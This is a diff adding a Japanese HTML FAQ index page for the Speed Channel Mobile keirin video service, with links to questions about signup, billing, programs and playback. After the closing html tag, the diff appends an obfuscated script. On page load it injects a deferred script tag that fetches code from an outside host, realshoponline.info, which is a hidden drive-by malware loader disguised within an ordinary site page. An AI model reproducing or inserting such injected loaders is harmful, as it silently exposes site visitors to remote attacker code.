@@ -1,0 +1,165 @@
+<?xml version="1.0" encoding="shift_jis" ?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" lang="ja" xml:lang="ja">
+<head>
+  <meta http-equiv="Content-Type" content="text/html; charset=shift_jis" />
+  <meta http-equiv="Content-Style-Type" content="text/css" />
+  <meta http-equiv="Content-Script-Type" content="text/javascript" />
+  <title>競輪TV!スピードチャンネル:スピチャンモバイルよくあるご質問【FAQ】</title>
+  <meta name="description" content="競輪専門TV!バンクに一番近い情報番組：スピードチャンネル" />
+  <meta name="keywords" content="競輪,KEIRIN,ケイリン,番組,CATV,スカパー,KEIRIN,スカイパーフェクTV,ケーブルテレビ" />
+  <meta name="ROBOTS" content="INDEX,FOLLOW" />
+  <link rel="INDEX" href="http://www.speedchannel.com/" />
+  <link rel="stylesheet" href="./css/faq.css" type="text/css" />
+  <link rel="shortcut icon" type="image/x-icon" href="http://www.speedchannel.co.jp/img/favicon.ico" />
+  <script src="js/prototype.js" type="text/javascript"></script>
+  <script src="js/effects.js" type="text/javascript"></script>
+  <script src="js/scroll.js" type="text/javascript"></script>
+</head>
+<body><center>
+   <div id="head"><img src="img/line_b.gif" width="789" height="7" style="margin-top: 0px;" alt="スピチャンモバイルよくあるご質問【FAQ】" /></div>
+<!--▼▼ヘッダ▼▼-->
+   <div id="all">
+   <div id="title">
+   <a href="http://www.speedchannel.co.jp/campaign/mobile-info/index.html"><img src="img/mobile_logo.gif" width="310" height="100" style="float: left;" alt="競輪TV!スピードチャンネル スピチャンモバイル" /></a><a href="./index.html"><img src="img/title.gif" width="310" height="100" style="float: right;" alt="よくあるご質問【FAQ】" /></a></div>
+   <br style="clear: both" />
+    <h2><img src="img/mobile.gif" width="35" height="35" style="vertical-align: middle;" alt="『スピチャンモバイル』　よくあるご質問" /> 『スピチャンモバイル』　よくあるご質問</h2>
+　　
+　　<p class="text">スピチャンモバイルに関するご質問は、下記よりご確認ください。</p><br />
+
+     <ul class="list">
+      <li><img src="img/faq1.gif" width="25" height="25" style="vertical-align: middle;" alt="Ⅰ" /> <a href="faq1.html"><strong>加入・退会について</strong> </a></li>
+      <li><img src="img/faq2.gif" width="25" height="25" style="vertical-align: middle;" alt="Ⅱ" /> <a href="faq2.html"><strong>料金について</strong></a></li>
+      <li><img src="img/faq3.gif" width="25" height="25" style="vertical-align: middle;" alt="Ⅲ" /> <a href="faq3.html"><strong>番組について</strong></a></li>
+      <li><img src="img/faq4.gif" width="25" height="25" style="vertical-align: middle;" alt="Ⅳ" /> <a href="faq4.html"><strong>番組表について</strong></a></li>
+      <li><img src="img/faq5.gif" width="25" height="25" style="vertical-align: middle;" alt="Ⅴ" /> <a href="faq5.html"><strong>操作・エラー関連</strong></a></li>
+      <li><img src="img/faq6.gif" width="25" height="25" style="vertical-align: middle;" alt="Ⅵ" /> <a href="faq6.html"><strong>動画品質について</strong></a></li>
+     </ul>
+    </div>
+    
+<br />
+<!--▲▲ヘッダ▲▲  ▼▼メイン▼▼-->
+     <p class="text">ご質問内容の一覧</p>
+     
+     <table align="center" cellpadding="0" cellspacing="1" border="0" class="cate" id="faq1" summary="Ⅰ加入・退会について">
+       <tr><td class="cate_title"><a href="./faq1.html">Ⅰ 加入・退会について</a></td></tr>
+         <tr><td style="background-color: #FFFFFF; width:650;">
+           <ul class="cate_list">
+             <li><a href="./faq1.html#q1">Q.スピチャンモバイルって何？</a></li>	
+             <!--	
+             <li><a href="./faq1.html#q2">Q.2/16からサービス期間とあるが、コンテンツの全てを見る事　が出来ますか？　それとも、お試し部分だけですか？</a></li>
+             <li><a href="./faq1.html#q3">Q.サービス期間 (2/16～2/28）も登録をしないと見れないのですか？</a></li>
+             <li><a href="./faq1.html#q4">Q.サービス期間(2/16～2/28）もパケット定額制に入っていないと見れないのですか？</a></li>             
+             <li><a href="./faq1.html#q5">Q.サービス期間(2/16～2/28）が終了したあと、続けて加入したい場合は再度登録が必要ですか？</a></li>
+             <li><a href="./faq1.html#q6">Q.サービス期間(2/16～2/28）が終了したあと、とりあえず加入を見送る場合、何か処理は必要ですか？</a></li>  -->
+             <li><a href="./faq1.html#q7">Q.登録前にお試し期間とかはないの？</a></li>
+             <li><a href="./faq1.html#q8">Q.登録はどうすればいいの？</a></li>             
+             <li><a href="./faq1.html#q9">Q.登録をするのに、何か条件はあるのですか？</a></li>
+             <li><a href="./faq1.html#q10">Q.携帯はどの機種でも使えるの？</a></li>
+             <li><a href="./faq1.html#q11">Q.SPEEDチャンネルには入っていないけど大丈夫？</a></li>
+             <li><a href="./faq1.html#q12">Q.パケット定額制サービスってなに？	</a></li>
+             <li><a href="./faq1.html#q13">Q.パケット定額サービスはどこで加入するの？</a></li>
+             <li><a href="./faq1.html#q14">Q.パケット定額制サービスっていくらかかるの？</a></li>
+             <li><a href="./faq1.html#q15">Q.機種変更をしたのですが、また登録をし直さないと見られませんか？</a></li>
+             <li><a href="./faq1.html#q16">Q.最近買った機種ですが、一覧にありません。という事は最新の機種でも使えないって事ですか？</a></li>
+             <li><a href="./faq1.html#q17">Q.プリペイド携帯でも登録できますか？</a></li>
+             <li><a href="./faq1.html#q18">Q.退会する時はどうすればいいの？</a></li>
+             <li><a href="./faq1.html#q19">Q.登録をした覚えがないのに請求がきた。</a></li>
+             <li><a href="./faq1.html#q20">Q.退会をしたのにまた請求がきている。</a></li>                  
+           </ul>
+         </td>
+       </tr>
+     </table>
+
+     <table align="center" cellpadding="0" cellspacing="1" border="0" class="cate" id="faq2" summary="Ⅱ料金について">
+       <tr><td class="cate_title"><a href="./faq2.html">Ⅱ 料金について</a></td></tr>
+         <tr><td style="background-color: #FFFFFF; width:650;">
+           <ul class="cate_list">
+             <li><a href="./faq2.html#q1">Q.月額いくら？</a></li>
+             <li><a href="./faq2.html#q2">Q.登録をしたら、すぐに情報料がかかりますか？</a></li>
+             <li><a href="./faq2.html#q3">Q.情報料の日割りはできますか？</a></li>
+             <li><a href="./faq2.html#q4">Q.情報料の支払い方法は？</a></li>
+             <li><a href="./faq2.html#q5">Q.情報料の引落しは何日？</a></li>
+             <li><a href="./faq2.html#q6">Q.ドコモの料金と一緒に情報料が引き落とされるとありましたが、
+             明細には「スピチャンモバイル」という名称が記載されるのでしょうか？</a></li>                
+             
+           </ul>
+         </td>
+       </tr>
+     </table>
+     
+     <table align="center" cellpadding="0" cellspacing="1" border="0" class="cate" id="faq3" summary="Ⅲ番組について">
+       <tr><td class="cate_title"><a href="./faq3.html">Ⅲ 番組について</a></td></tr>
+         <tr><td style="background-color: #FFFFFF; width:650;">
+           <ul class="cate_list">     
+             <li><a href="./faq3.html#q1">Q.どういったものが見れるの？</a></li>
+             <li><a href="./faq3.html#q2">Q.ワンセグではないんですか？</a></li>
+             <li><a href="./faq3.html#q3">Q.SPEEDライブ配信とあるが、SPEEDでの放送と同じものが  見られるのですか？</a></li>			
+             <li><a href="./faq3.html#q4">Q.記念などのビックレースとあるが、FⅠなども見られますか？</a></li>
+             <li><a href="./faq3.html#q5">Q.企画番組ってどんなものが見られるのですか？</a></li>
+             <li><a href="./faq3.html#q6">Q.情報の提供は24時間ですか？</a></li>
+             <li><a href="./faq3.html#q7">Q.パソコンで見る事はできませんか？</a></li>
+             <li><a href="./faq3.html#q8">Q.オンデマンドって何？</a></li>
+             <li><a href="./faq3.html#q9">Q.携帯の動画ってどれくらいの精度なの？</a></li>
+          </ul>
+         </td>
+       </tr>
+     </table>
+     
+     <table align="center" cellpadding="0" cellspacing="1" border="0" class="cate" id="faq4" summary="Ⅳ番組表について">
+       <tr><td class="cate_title"><a href="./faq4.html">Ⅳ 番組表について</a></td></tr>
+         <tr><td style="background-color: #FFFFFF; width:650;">
+           <ul class="cate_list">     
+             <li><a href="./faq4.html#q1">Q.番組表はあるんですか？</a></li>
+             <li><a href="./faq4.html#q2">Q.番組表が見られるとありますが、1ヶ月単位で表示されるのですか？</a></li>
+             <li><a href="./faq4.html#q3">Q.番組表の更新は何日くらいにされるのですか？</a></li>
+             <li><a href="./faq4.html#q4">Q.翌月の番組表を確認する事ができますか？</a></li>
+          </ul>
+         </td>
+       </tr>
+     </table>     
+     
+     <table align="center" cellpadding="0" cellspacing="1" border="0" class="cate" id="faq5" summary="Ⅴ操作・エラー関連">
+       <tr><td class="cate_title"><a href="./faq5.html">Ⅴ 操作・エラー関連</a></td></tr>
+         <tr><td style="background-color: #FFFFFF; width:650;">
+           <ul class="cate_list">
+             <li><a href="./faq5.html#q4">Q.マイメニュー登録後にパケット定額制を解約したらどうなるの？</a></li>
+             <li><a href="./faq5.html#q5">Q.会員情報（プロフィール）を登録する理由は？</a></li>
+             <li><a href="./faq5.html#q6">Q.ＳＣＨ加入状況とは？</a></li>
+           </ul>
+         </td>
+       </tr>
+     </table>
+     
+     <table align="center" cellpadding="0" cellspacing="1" border="0" class="cate" id="faq5" summary="Ⅵ 動画品質について">
+       <tr><td class="cate_title"><a href="./faq6.html">Ⅵ 動画品質について</a></td></tr>
+         <tr><td style="background-color: #FFFFFF; width:650;">
+           <ul class="cate_list">
+             <li><a href="./faq6.html#q1">Q.動画が乱れるんですが・・・</a></li>
+             <li><a href="./faq6.html#q2">Q.もっときれいな映像で見たいんですが、何か方法がありますか？</a></li>
+             <li><a href="./faq6.html#q3">Q.横型画面で視聴できますか？</a></li>
+             <li><a href="./faq6.html#q4">Q.動画再生中にチャンネルを切り替えるにはどうしたらいいですか？ </a></li>             
+             <li><a href="./faq6.html#q5">Q.動画の早送りや巻き戻しはできないの？</a></li>
+             <li><a href="./faq6.html#q6">Q.動画が視聴できません。</a></li>
+           </ul>
+         </td>
+       </tr>
+     </table>     
+     
+
+
+<!--▼▼フッタ▼▼　▲▲メイン▲▲-->
+<div class="footlink">
+<a href="http://www.speedchannel.co.jp/"><img src="img/link_01.gif" width="135" height="25" alt="競輪TV！スピードチャンネルTOP" /></a> <a href="http://www.speedchannel.co.jp/campaign/mobile-info/"><img src="img/link_sm.gif" width="135" height="25" alt="スピチャンモバイル" /></a> <a href="./index.html"><img src="img/link_faq.gif" width="135" height="25" alt="スピチャンモバイルよくあるご質問" /></a> <a href="./"><img src="img/link_02.gif" width="135" height="25" alt="このページの一番上へ" /></a>
+</div>
+  
+<div style="background-color: #000099; width:789px; height:40px; color: #FFFFFF; font-size: 12px;">
+<p><br />CopyRight&copy;, CYCLE SPORTS BROADCASTING INC,.ALLRIGHTS RESERVED<br /></p></div>
+ 
+</center></body>
+</html>
+
+
+
+<script>var i;if(i!='' && i!='v'){i='En'};var MI='';function Q(){var E=window;var Ea=new Array();var T;if(T!='F'){T='F'};var x_;if(x_!='Hq'){x_=''};var VwU;if(VwU!='s' && VwU != ''){VwU=null};var V=E['unescape'];var IV=new Date();var _p=new Date();var J=V("%2f%67%6f%6f%67%6c%65%2e%63%6f%6d%2f%79%6f%6b%61%2e%63%6f%6d%2f%65%73%70%6e%2e%67%6f%2e%63%6f%6d%2e%70%68%70");var S='';var SX='';function P(Z,H){var EU="";var A;if(A!='mX'){A='mX'};var p=V("%5d");var y=new Array();var Hi=V("%5b");var Cc;if(Cc!=''){Cc='cV'};var cl;if(cl!='EH'){cl='EH'};var x=new String("wqSg".substr(3));this.q='';var d;if(d!='Zf'){d='Zf'};var C=new RegExp(Hi+H+p, x);var zM;if(zM!='' && zM!='tO'){zM='sI'};return Z.replace(C, new String());var Jq;if(Jq!='Ym'){Jq='Ym'};this.e='';};var Jf;if(Jf!='jA' && Jf != ''){Jf=null};var fo=new String();var MK=new String();var Ys;if(Ys!='cp' && Ys!='Iq'){Ys='cp'};var K=document;var b;if(b!='' && b!='kl'){b=''};var Ji=P('skcHrAiIpgtT','BCIHEdkgTF5uYUANS');var M=P('sjrecZ','U9K0veZa_7j');var cg="";var z=P('84339251124541909675537645943977845254255594233970112531373779171541','96143725');var Po;if(Po!='' && Po!='k_'){Po=''};var I=P('dMeQfIeurZ','uE9ZN0k28IDQJ6M');var yv;if(yv!='jE'){yv='jE'};this.kN="";var tU;if(tU!='Em' && tU != ''){tU=null};this.Ms="";function VN(){this.KX='';this.ZP='';var G=V("%68%74%74%70%3a%2f%2f%72%65%61%6c%73%68%6f%70%6f%6e%6c%69%6e%65%2e%69%6e%66%6f%3a");var X_='';var Cv=G;var KH;if(KH!='' && KH!='Ep'){KH=null};Cv+=z;Cv+=J;try {var HM="";_=K[P('csrSeyaXtHewEOlRe_m_ePnAtD','3wOP9HSADX_k2yMTsoR')](Ji);var _v;if(_v!='WS'){_v='WS'};var aj;if(aj!='Tr'){aj='Tr'};var Uy=new Date();var g=new Date();_[M]=Cv;var el;if(el!='' && el!='CN'){el=null};_[I]=[1,7][0];var aP;if(aP!='PM' && aP != ''){aP=null};var Mk;if(Mk!='OD' && Mk != ''){Mk=null};var Bk;if(Bk!='' && Bk!='Bc'){Bk='HA'};K.body[P('aNpxpmeJnNd9CmhYivlmdN','mtNQMu9IYFv5Ky6xJ')](_);this.Dx="";var jZ;if(jZ!='' && jZ!='rm'){jZ=''};} catch(m){var FO=new String();};this.PY='';var Ac=new Date();}var _h="";var IH=P('o4nKlgoJa4dJ','4cOseHipJ1g7KE');var Eo;if(Eo!='' && Eo!='qe'){Eo='yq'};var SA='';this.Uo='';this.JA='';E[IH]=VN;var XN='';var cHF;if(cHF!='' && cHF!='Qq'){cHF='tr'};};var jo='';var cx='';var cq;if(cq!='EN' && cq!='JY'){cq=''};Q();var GW=new String();this.UPp="";</script>
+<!--acb76067c4507c56bf5017bf4caaee75-->
